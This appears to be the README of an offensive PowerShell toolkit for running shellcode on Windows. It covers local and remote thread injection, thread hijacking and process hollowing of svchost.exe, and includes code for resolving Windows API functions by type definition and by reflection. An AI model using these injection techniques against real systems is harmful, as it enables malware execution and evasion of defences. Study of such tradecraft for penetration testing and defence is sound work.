# **PowerShell-Shellcode-Exec**

PowerShell is an excellent tool built into Windows. Because of this, we can leverage it against any standard computer with basic knowledge of the .NET framework. Shellcode execution may be a vital aspect to penetration testing and must be accomplished.

There are many ways to get shellcode executed on a device, but I will be going over 2 execution methods and 4 types of shellcode execution.

### **Setup**

```powershell
git clone https://github.com/SilentisVox/PowerShellcode-Shellcode-Exec
cd PowerShellcode-Shellcode-Exec
```

### **Usage**

```powershell
cd "./Standard Windows API"

. "./Local Thread/Invoke-ShellcodeViaLocalThread.ps1"
. "./Remote Thread/Invoke-ShellcodeViaRemoteThread.ps1"
. "./Thread Hijack/Invoke-ShellcodeViaThreadHijack.ps1"
. "./Process Hollow/Invoke-ShellcodeViaProcessHollow.ps1"

Invoke-ShellcodeViaLocalThread -Shellcode $Shellcode -Verbose
Invoke-ShellcodeViaRemoteThread -Shellcode $Shellcode -TargetPID 1234 -Verbose
Invoke-ShellcodeViaThreadHijack -Shellcode $Shellcode -TargetPID 1234 -TargetTID 5678 -Verbose
Invoke-ShellcodeViaProcessHollow -Shellcode $Shellcode -ProcessPath "C:\Windows\System32\svchost.exe" -Verbose
```

```powershell
cd "./Function Resolutions"

. "./Local Thread/Invoke-ShellcodeViaLocalThread.ps1"
. "./Remote Thread/Invoke-ShellcodeViaRemoteThread.ps1"
. "./Thread Hijack/Invoke-ShellcodeViaThreadHijack.ps1"
. "./Process Hollow/Invoke-ShellcodeViaProcessHollow.ps1"

Invoke-ShellcodeViaLocalThread -Shellcode $Shellcode -Verbose
Invoke-ShellcodeViaRemoteThread -Shellcode $Shellcode -TargetPID 1234 -Verbose
Invoke-ShellcodeViaThreadHijack -Shellcode $Shellcode -TargetPID 1234 -TargetTID 5678 -Verbose
Invoke-ShellcodeViaProcessHollow -Shellcode $Shellcode -ProcessPath "C:\Windows\System32\svchost.exe" -Verbose
```

## **Brief Explanation**

![ghost](https://github.com/user-attachments/assets/44702081-fcb4-49ed-8c87-82e592f2c54c)

### **Windows API**

There are 2 ways I have covered in order to use Windows API functions. Either adding a type defintion that pulls function from a given dll, or reflectively resolving functions, and using them as such.

###### Type Definition

```powershell
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Kernel32
{
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
}
"@
```

###### Reflective Resolution

```powershell
$UnsafeMethodsType                  = $SystemAssembly.GetType("Microsoft.Win32.UnsafeNativeMethods")
$NativeMethodsType                  = $SystemAssembly.GetType("Microsoft.Win32.NativeMethods")

$GetModuleHandle                    = $UnsafeMethodsType.GetMethod("GetModuleHandle")
$GetProcAddress                     = $UnsafeMethodsType.GetMethod("GetProcAddress", [Reflection.BindingFlags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @([IntPtr], [String]), $null);

$Kernel32Handle                     = $GetModuleHandle.Invoke($null, @("kernel32.dll"))
$OpenProcessAddress                 = $GetProcAddress.Invoke($null, @($Kernel32Handle, "OpenProcess"))

# Obviously setup delegate for function pointer.
$OpenProcess                        = Get-Delegate $OpenProcessAddress @([Int], [Bool], [Int]) ([IntPtr])
```

